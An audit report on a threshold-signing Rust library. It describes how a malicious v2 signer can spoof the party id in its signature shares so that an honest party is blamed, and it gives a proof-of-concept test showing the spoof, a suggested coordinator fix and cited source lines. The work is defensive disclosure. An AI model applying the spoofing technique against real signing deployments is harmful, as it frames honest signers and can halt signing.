Audit Report

## Title
Incorrect Malicious Signer Identification Due to Unauthenticated SignatureShare.id Field in v2

## Summary
The v2 coordinator does not validate that the `id` field within `SignatureShare` objects matches the authenticated `signer_id` of the sender. A malicious signer can create signature shares with a spoofed `id` field, causing signature verification to fail and blame to be incorrectly assigned to an innocent party instead of the actual malicious signer.

## Finding Description

The vulnerability exists due to insufficient validation of the `SignatureShare` structure in v2. The `SignatureShare` struct contains a public `id` field representing the party ID. [1](#0-0) 

While packet-level authentication ensures messages come from legitimate signers, the coordinator fails to validate that the `id` field within signature shares matches the authenticated sender.

**The Attack Flow:**

1. **Missing Validation at Storage**: The coordinator stores signature shares indexed by the authenticated `signer_id` from the packet but never validates that `SignatureShare.id` matches this sender ID. [2](#0-1) 

2. **Partial Validation Only**: The coordinator validates that `key_ids` match the configured keys for the sender, but does NOT validate the `id` field. [3](#0-2) 

3. **Aggregator Trusts Unvalidated Field**: During aggregation, the aggregator extracts party IDs directly from `SignatureShare.id` (not from the authenticated sender) for binding computation. [4](#0-3) 

4. **Binding Computation Dependency**: The binding computation depends critically on the party ID - it is serialized directly into the hash input used to compute the binding value. [5](#0-4) 

5. **Verification Mismatch**: When an honest signer creates their signature share, they compute it using their actual party ID for the binding value. [6](#0-5)  But if a malicious signer provides a signature share with a spoofed `id`, the aggregator will use the spoofed party ID for binding computation, creating a mismatch that causes verification to fail.

6. **Incorrect Blame Assignment**: When verification fails, blame is assigned based on `SignatureShare.id`, incorrectly identifying the innocent party whose ID was spoofed. [7](#0-6)  This error is then returned to the coordinator. [8](#0-7) 

**Why v1 is Not Affected:**

In v1, each party controls exactly one key where `party_id == key_id`. When a signer creates a signature share, they set `key_ids: vec![self.id]`. [9](#0-8) 

If a malicious v1 signer tries to spoof another party's ID, they would need to use that party's key_id (since party_id == key_id in v1). However, the coordinator validates that key_ids match the sender's configured keys, which would fail. In v2, party_id and key_ids are decoupled (one party controls multiple keys), so this protection does not apply.

**The Exploit:**

A compromised signer modifies their code to create signature shares with an incorrect `id` field. In `v2::Party::sign_with_tweak()`, they change the assignment from `id: self.party_id` to `id: <target_victim_id>`. [10](#0-9) 

## Impact Explanation

This vulnerability enables a compromised signer to frame honest parties for signing failures:

1. A malicious signer provides a signature share with a spoofed `id` field
2. The signature verification fails due to binding value mismatch
3. The `BadPartySigs` error incorrectly identifies the innocent party [11](#0-10) 
4. External systems relying on blame assignment may exclude the innocent signer
5. Repeated attacks could exclude enough honest signers to drop below the signing threshold

In a deployment with 10 signers and threshold 7, an attacker who compromises 1 signer could frame 3 innocent signers over multiple rounds, reducing the system to 6 uncompromised, non-excluded signers - below the threshold and unable to produce signatures.

This maps to **Medium severity** per the protocol scope: "Any transient consensus failures." The vulnerability causes signing protocol failures with incorrect blame assignment, potentially leading to exclusion of honest parties and temporary loss of signing capability.

## Likelihood Explanation

**Required Attacker Capabilities:**
- Control of one signer node (within the threshold-1 threat model)
- Ability to modify signer software to create malformed `SignatureShare` objects
- No additional cryptographic secrets required beyond being a legitimate signer

**Attack Complexity:**
Low. The attack requires only modifying a single field in the SignatureShare creation. No timing constraints, race conditions, or complex cryptographic operations are needed.

**Estimated Probability:**
If a signer is compromised: High (>70%). The attack is trivial to execute once a signer node is controlled, requiring only a single-field modification in the signature share construction.

## Recommendation

Add validation in the coordinator's `gather_sig_shares` method to verify that each `SignatureShare.id` matches the authenticated `signer_id`. For v2, this requires maintaining a mapping between signer_id and party_id in the coordinator configuration.

Suggested fix in `src/state_machine/coordinator/fire.rs` after line 1076:

```rust
// Validate that signature share party IDs match the expected party ID for this signer
let expected_party_id = self.config.signer_to_party_id
    .get(&sig_share_response.signer_id)
    .ok_or(Error::MissingPartyIDForSigner(sig_share_response.signer_id))?;

for sig_share in &sig_share_response.signature_shares {
    if sig_share.id != *expected_party_id {
        warn!(signer_id = %sig_share_response.signer_id, 
              claimed_party_id = %sig_share.id,
              expected_party_id = %expected_party_id,
              "SignatureShare party ID mismatch");
        return Err(Error::InvalidPartyIDInSignatureShare(
            sig_share_response.signer_id, 
            sig_share.id, 
            *expected_party_id
        ));
    }
}
```

## Proof of Concept

```rust
#[cfg(test)]
mod vulnerability_test {
    use super::*;
    
    #[test]
    fn test_spoofed_party_id_causes_incorrect_blame() {
        // This test demonstrates the vulnerability by:
        // 1. Running DKG with 3 v2 parties
        // 2. Having party 0 spoof their signature share's id field to claim they are party 1
        // 3. Showing that BadPartySigs incorrectly blames party 1 instead of party 0
        
        const NUM_SIGNERS: u32 = 3;
        const KEYS_PER_SIGNER: u32 = 4;
        
        let (mut coordinators, mut signers) = 
            run_dkg::<fire::Coordinator<v2::Aggregator>, v2::Signer>(NUM_SIGNERS, KEYS_PER_SIGNER);
        
        let msg = b"test message".to_vec();
        let message = coordinators[0].start_signing_round(&msg, SignatureType::Frost, None).unwrap();
        
        // Gather nonces
        let (messages, _) = feedback_messages(&mut coordinators, &mut signers, &[message]);
        
        // Malicious party 0 spoofs their signature share to claim they are party 1
        let (_, results) = feedback_mutated_messages(
            &mut coordinators,
            &mut signers,
            &messages,
            |signer, packets| {
                if signer.signer_id != 0 {
                    return packets.clone();
                }
                packets.iter().map(|packet| {
                    let Message::SignatureShareResponse(response) = &packet.msg else {
                        return packet.clone();
                    };
                    // Spoof the party ID to frame party 1
                    let spoofed_shares: Vec<SignatureShare> = response
                        .signature_shares
                        .iter()
                        .map(|share| SignatureShare {
                            id: 1, // SPOOFED - claiming to be party 1
                            z_i: share.z_i,
                            key_ids: share.key_ids.clone(),
                        })
                        .collect();
                    Packet {
                        msg: Message::SignatureShareResponse(SignatureShareResponse {
                            dkg_id: response.dkg_id,
                            sign_id: response.sign_id,
                            sign_iter_id: response.sign_iter_id,
                            signer_id: response.signer_id,
                            signature_shares: spoofed_shares,
                        }),
                        sig: vec![],
                    }
                }).collect()
            },
        );
        
        // Verify that BadPartySigs incorrectly blames party 1 (the victim)
        // instead of party 0 (the actual malicious signer)
        assert_eq!(results.len(), 1);
        let OperationResult::SignError(SignError::Coordinator(Error::Aggregator(
            AggregatorError::BadPartySigs(parties),
        ))) = &results[0] else {
            panic!("Expected BadPartySigs error");
        };
        
        // The vulnerability: party 1 is blamed instead of party 0
        assert!(parties.contains(&1), "Party 1 should be incorrectly blamed");
        assert!(!parties.contains(&0), "Party 0 (actual malicious signer) is NOT blamed");
    }
}
```

### Citations

**File:** src/common.rs (L213-220)
```rust
pub struct SignatureShare {
    /// The ID of the party
    pub id: u32,
    /// The party signature
    pub z_i: Scalar,
    /// The key IDs of the party
    pub key_ids: Vec<u32>,
}
```

**File:** src/state_machine/coordinator/fire.rs (L1066-1076)
```rust
        let mut sig_share_response_key_ids = HashSet::new();
        for sig_share in &sig_share_response.signature_shares {
            for key_id in &sig_share.key_ids {
                sig_share_response_key_ids.insert(*key_id);
            }
        }

        if *signer_key_ids != sig_share_response_key_ids {
            warn!(signer_id = %sig_share_response.signer_id, "SignatureShareResponse key_ids didn't match config");
            return Err(Error::BadKeyIDsForSigner(sig_share_response.signer_id));
        }
```

**File:** src/state_machine/coordinator/fire.rs (L1088-1091)
```rust
        self.signature_shares.insert(
            sig_share_response.signer_id,
            sig_share_response.signature_shares.clone(),
        );
```

**File:** src/v2.rs (L257-257)
```rust
        let mut r = &self.nonce.d + &self.nonce.e * compute::binding(&self.id(), nonces, msg);
```

**File:** src/v2.rs (L271-275)
```rust
        SignatureShare {
            id: self.party_id,
            z_i: z,
            key_ids: self.key_ids.clone(),
        }
```

**File:** src/v2.rs (L308-309)
```rust
        let party_ids: Vec<u32> = sig_shares.iter().map(|ss| ss.id).collect();
        let (_Rs, R) = compute::intermediate(msg, &party_ids, nonces);
```

**File:** src/v2.rs (L407-407)
```rust
                bad_party_sigs.push(sig_shares[i].id);
```

**File:** src/v2.rs (L460-460)
```rust
            Err(self.check_signature_shares(msg, nonces, sig_shares, key_ids, None))
```

**File:** src/compute.rs (L17-33)
```rust
pub fn binding(id: &Scalar, B: &[PublicNonce], msg: &[u8]) -> Scalar {
    let prefix = b"WSTS/binding";

    // Serialize all input into a buffer
    let mut buf = Vec::new();
    buf.extend_from_slice(&id.to_bytes());

    for b in B {
        buf.extend_from_slice(b.D.compress().as_bytes());
        buf.extend_from_slice(b.E.compress().as_bytes());
    }

    buf.extend_from_slice(msg);

    expand_to_scalar(&buf, prefix)
        .expect("FATAL: DST is less than 256 bytes so operation should not fail")
}
```

**File:** src/v1.rs (L289-293)
```rust
        SignatureShare {
            id: self.id,
            z_i: z,
            key_ids: vec![self.id],
        }
```

**File:** src/errors.rs (L50-52)
```rust
    #[error("bad party sigs from {0:?}")]
    /// The party signatures which failed to verify
    BadPartySigs(Vec<u32>),
```
